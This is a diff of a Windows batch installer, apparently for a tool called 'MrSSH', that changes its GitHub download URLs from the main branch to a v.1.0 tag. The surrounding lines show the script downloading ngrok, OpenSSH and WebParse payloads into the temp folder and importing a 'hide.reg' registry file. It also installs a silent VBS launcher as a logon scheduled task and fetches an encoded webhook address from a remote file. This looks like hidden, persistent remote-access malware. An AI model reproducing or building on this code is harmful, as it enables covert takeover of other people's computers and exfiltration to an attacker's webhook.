@@ -6,7 +6,7 @@ pushd %temp%
 set "Version=1.0"
 set "DefaultToken=dheb"
 set Files=NgrokRun.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
-set Github=https://github.com/dh3b/MrSSH/raw/main/Files/
+set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
 set "Folder=%temp%\Files"
 :: </Variables>
 
@@ -72,13 +72,13 @@ reg import "!Folder!\hide.reg"
 
 :: <Startup>
 mkdir %appdata%\MrSSH
-pushd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Silentlog.vbs" -o "Silent.vbs"
+pushd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Files/Silentlog.vbs" -o "Silent.vbs"
 schtasks /create /tn "MrSSH" /sc onlogon /tr "%appdata%\MrSSH\Silent.vbs" /F
 pushd !Folder!
 :: </Startup>
 
 :: <Set webhook>
-curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Identifiers/Redirect.ini" -o "Redirect.ini"
+curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/v.1.0/Identifiers/Redirect.ini" -o "Redirect.ini"
 FOR /F "delims=" %%F IN (tokenName.txt) DO SET token=%%F
 FOR /F "tokens=* USEBACKQ" %%F IN (`findstr "%token%" "redirect.ini"`) DO (SET hexwebhook=%%F)
 set "hexwebhook=%hexwebhook:~-244%"
